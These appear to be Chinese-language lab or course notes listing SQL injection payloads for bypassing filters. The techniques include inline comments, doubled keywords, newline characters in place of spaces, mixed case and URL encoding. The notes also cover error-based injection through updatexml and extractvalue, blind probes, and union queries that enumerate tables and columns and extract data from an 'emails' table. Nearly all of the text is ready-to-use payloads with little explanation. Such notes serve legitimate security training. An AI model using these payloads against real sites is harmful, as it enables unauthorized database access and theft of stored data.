### 1. 注释绕过

```
-1 or (select 1,2,database())#
-1%20or%20(select%201%2C2%2Cdatabase())%23

-1/*!or*/SelECt 1,2,database()#

-1/*!or*/or+SelECt 1,2,database()#

-1Lyohb3IqLw==or+(SelECt 1,2,database())#

-1%2F*!or*%2F(SelECt 1,2,database())%23

-1%2F*!or*%2F(SelECt%201%2C2%2Cdatabase())%23		//大小写+编码替换

-1%2F*!or*%2F(SelselectECt%201%2C2%2Cdatadatabase()base())%23		//大小写+字符替换+编码替换

-1%0a||%0a(SelselectECt%0a1%2C2%2Cdatadatabase()base())%23		//大小写+关键字替换+编码替换

-1%0a||%0a(SelselectECt%0a1%2C2%2Cdatadatabasebase())%23	

-1 || +SelECt 1,2,database()#

1 and 1=2#
1 && 1=2#
1%20%26%26%201%3D2%23
1%20%2526%2526%201%3D2%23

1/*!and*/1=2#
1%2F*!and*%2F1%3D2%23
1%2F*!&&*%2F1%3D2%23
1%2F*!%26%26*%2F1%3D2%23

select username='',password='',xxx where id= ;

select username='',password='',xxx where id=-1 union select 1,2,3 ||1=1

//分析sql语句，进而得出结论
//$sql="SELECT * FROM users WHERE id='  1' and 1=2 '||  ' LIMIT 0,1";

-1 union select 1,2,3 ||
①-1' union select 1,2,3 'or
②1' or '1'='1
```

### 2. and和or替换

```
-1' aandnd updatexml(1,concat(0x7e,database(),0x7e),1) oorr '1'='1
```

### 3. 绕过空格、注释、and和or

```
①1%27%0aaandnd%0bupdatexml(1%2Cconcat(0x7e%2Cdatabase()%2C0x7e)%2C1)%0aoorr%0a%271%27%3D%271

②0'%0a&&union%0aselect%0b1,2,3%0a||%0a'1'='1

```

### 4. 绕过union和select

```
0'%0BUNion%0BseLect%0B1,2,3%0Bor%0B'1'='1
```

### 5.[检测and、or、空格、=、,]

```
0%27%0aunion%0aselect%0a*%0afrom%0a(select%0a1)a%0ajoin%0a(select%0adatabase())b%0a%23
```

### 6. 第六关

```
//没有报错显示，故不能使用报错注入
0%0a&&%0aupdatexml(1,conconcatcat(0x7e,database(),0x7e),1)%0a||%0a'1'='1

1%0b&&%0bascii(left(database(),1))=115
```



### 7.作业

```
1%20union/*!%20*/select%20*%20from%20(select%201)a%20join%20(select%202)b%20join%20(select%203)c%20||%201=1

0'%20ununionion%20seselectlect%20*%20from%20(select%201)a%20join%20(select%202)b%20join%20(select%203)c%20||%201=1

1%20&&%20select%201,2,3%20||%201=1

1 and (select 1,2,3) or 1=1
=>1 and (select * from (select 1)a join (select 2)b join (select 3)c) or 1=1
=>0%20&&%20(SELect%20*%20from%20(SELect%201)a%20join%20(SELect%202)b%20join%20(SELect%203)c)%20||%201=1
=>
1' union select 1,2,3 || '1'='1

1' union select * from (select 1)a join (select 2)b join (select 3)c || '1'='1

1%20&&%20updatexml(1,conconcatcat(0x7e,1,0x7e),1)%20||%0a1=1

1%20&&%20extractvalue(1,conconcatcat(CHAR(126),1,CHAR(126)))%20||%201=1

1%20&&%20(select%20count(*),concat(user(),floor(rand(0)*2))x%20group%20by%20x)%20||%201=1


and/or (union select) (select from) ,  大小写、重复 报错  %0a %0b  
```



```
and、or、 (union select)、（union all select）、大小写、内联注释 
```

```
0' union/*////*/select 1,database(),3 || --+

0' union/*////*/select user/*////*/(),database/*////*/(),3 --+

0' union/*////*/select 1,database/*////*/(),(select group_concat(table_name) /*!%23/*%0afrom*/ information_schema.tables where table_schema=database/*////*/()) --+

0' union/*////*/select 1,database/*////*/(),(select group_concat(column_name) /*!%23/*%0afrom*/ information_schema.columns where table_name='emails' /*!%23/*%0aand*/ table_schema=database/*!99999*/()) --+

0' union/*////*/select user/*////*/(),database/*////*/(),(select group_concat(concat(id,'~',email_id)) /*!%23/*%0afrom*/ emails)  --+
```



```
1. 绕过关键字检测
    a. user() --> user/*//--//*/()  或  database/*%!a*/()
    b. from  -->  /*!%23/*%0aform*/
    c. 大小写替换
    d. 重复关键字

2. 绕过2个及以上检测语句
union select  --> union/*//--/*/select
union select 1,2,3 -->   union /*!--+/*%0aselect/*!1,2,*/ 3
```

